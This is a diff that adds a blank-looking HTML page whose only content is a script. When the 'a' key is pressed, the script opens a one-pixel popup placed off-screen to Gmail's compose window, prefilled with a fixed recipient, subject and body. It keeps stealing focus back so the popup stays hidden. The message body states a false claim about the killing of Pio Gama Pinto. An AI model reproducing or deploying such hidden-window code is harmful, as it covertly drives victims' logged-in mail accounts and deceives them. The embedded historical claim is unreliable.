@@ -1,0 +1,55 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    </head>
+
+
+<body>
+	
+<script>
+
+ var newWin;
+  var y = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+  var x = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+  var windowPosX = x + 1500000;
+  var windowPosY = y + 1500000;
+  var isOpened = false;
+
+document.onkeyup = function(e) {
+  if(e.key == "a" && !isOpened){
+   launchWindow();
+  }
+}
+
+document.onkeydown = function(e) {
+  if(e.key=="a" && !isOpened){
+   launchWindow();
+   
+   setTimeout(function(){
+   newWin.open();
+   }, 6000);
+   
+   setTimeout(function(){
+   newWin.close();
+   }, 8000);
+   
+  }
+}
+
+ function launchWindow(){
+   newWin = window.open('https://mail.google.com/mail/u/0/?fs=1&to=escal8.user020@gmail.com&su=History+Lesson&body=In+the+year+1982,+Pio+Gama+pinto+was+killed+by+John+Kamau+of+Kenya&tf=cm', 'New Window', 'width=1,height=1,top='+windowPosY+',left='+windowPosX);
+   isOpened = true;
+ }
+ 
+ 
+ setInterval(function(){
+ window.focus();
+ }, 100);
+  
+</script>
+    
+
+</body>
+</html>
